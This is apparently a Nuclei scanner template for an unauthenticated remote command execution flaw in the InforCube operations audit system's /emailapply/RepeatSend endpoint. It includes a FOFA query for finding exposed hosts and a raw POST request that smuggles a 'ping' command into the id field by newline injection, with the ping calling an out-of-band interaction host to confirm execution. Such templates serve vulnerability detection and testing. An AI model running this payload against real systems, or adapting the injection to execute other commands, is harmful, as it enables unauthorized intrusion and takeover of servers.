id: shangxun-InforCube_RepeatSend-RCE
info:
  name: InforCube运维管理审计系统 RepeatSend 接口远程命令执行漏洞
  author: Unknown
  severity: high
  description: |-
    fofa：body="default/getloginhtml"
    上讯信息 InforCube运维管理审计系统 /emailapply/RepeatSend 接口包含未经验证的远程命令执行缺陷，未经授权的远程攻击者可通过该缺陷执行任意系统命令，进而实现服务器权限的非授权获取，导致系统完整性和可用性受损。
  reference:
  - https://Unknown.blog.csdn.net/article/details/140465200
  tags: 上讯信息-InforCube

http:
- raw:
  - |
    POST /emailapply/RepeatSend HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    id='%0aping {{interactsh-url}}'

  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - "dns"






